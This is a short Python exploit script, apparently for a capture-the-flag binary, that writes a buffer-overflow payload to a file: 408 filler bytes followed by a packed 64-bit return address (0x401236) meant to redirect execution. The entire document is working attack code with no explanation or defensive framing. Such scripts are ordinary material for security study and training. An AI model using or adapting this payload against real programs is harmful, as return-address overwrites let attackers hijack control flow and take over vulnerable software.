#!/usr/bin/env python3

from struct import pack

payload = b'a' * 408
payload += pack("<Q", 0x401236)

with open("f", "wb") as f:
    f.write(payload)
